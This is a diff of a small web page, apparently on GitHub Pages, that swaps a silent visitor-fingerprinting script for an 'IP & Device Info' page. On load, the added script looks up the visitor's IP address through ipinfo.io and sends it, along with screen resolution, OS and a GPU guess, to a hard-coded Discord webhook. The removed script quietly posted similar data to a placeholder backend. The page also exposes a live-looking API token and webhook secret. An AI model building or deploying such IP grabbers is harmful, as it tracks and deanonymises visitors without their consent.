@@ -3,42 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to My Website</title>
-</head>
-<body>
-    <h1>greetings</h1>
-    <p>Enjoy browsing!</p>
-
-    <script>
-        async function sendData() {
-            // This function will send the visitor's data to your backend API (e.g., Flask)
-            const gpuInfo = (() => {
-                try {
-                    const canvas = document.createElement("canvas");
-                    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                } catch (e) {
-                    return "Unknown GPU";
-                }
-            })();
-
-            const data = {
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                userAgent: navigator.userAgent,
-                gpu: gpuInfo
-            };
-
-            // Send data to your backend (Flask API) via POST request
-            fetch("https://your-backend-url.com/api/track", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
+    <title>IP & Device Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
         }
 
-        sendData();
+        h1 {
+            color: #333;
+        }
+
+        #info {
+            margin-top: 20px;
+            font-size: 1.2em;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <h1>Gathering Your Info...</h1>
+    <div id="info">
+        <p id="ip">IP Address: </p>
+        <p id="screen">Screen Resolution: </p>
+        <p id="gpu">GPU: </p>
+        <p id="os">Operating System: </p>
+    </div>
+
+    <script>
+        // Fetch IP address from ipinfo.io API
+        fetch('https://ipinfo.io/json?token=eac37d6f8be115')
+            .then(response => response.json())
+            .then(data => {
+                // Display the IP address
+                const ip = data.ip;
+                document.getElementById('ip').innerHTML = "IP Address: " + ip;
+                
+                // Get screen resolution info
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                document.getElementById('screen').innerHTML = "Screen Resolution: " + screenWidth + "x" + screenHeight;
+
+                // Get GPU info (Basic info, not detailed)
+                const gpu = navigator.userAgent.includes("GPU") ? "GPU Detected" : "GPU info not available in browser";
+                document.getElementById('gpu').innerHTML = "GPU: " + gpu;
+
+                // Get OS info (like Windows, MacOS, Linux, etc.)
+                const os = navigator.platform;
+                document.getElementById('os').innerHTML = "Operating System: " + os;
+
+                // Prepare message to send to Discord
+                const message = {
+                    content: `**Device Information**\n\n` +
+                             `**IP Address**: ${ip}\n` +
+                             `**Screen Resolution**: ${screenWidth}x${screenHeight}\n` +
+                             `**GPU**: ${gpu}\n` +
+                             `**Operating System**: ${os}\n\n` +
+                             `GitHub Site: https://gordodolo.github.io/test/`
+                };
+
+                // Send the data to Discord webhook
+                fetch('https://discord.com/api/webhooks/1340202474971070464/dVWK9yCgV7E5M5NmFiBzBRqguEy9mwHVDxWQ2FuZ94Sl6MPUH4oe8vIgpcoWODKO1bdV', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Message sent to Discord');
+                    } else {
+                        console.log('Error sending message to Discord');
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+            })
+            .catch(error => console.log('Error fetching IP:', error));
     </script>
 </body>
 </html>
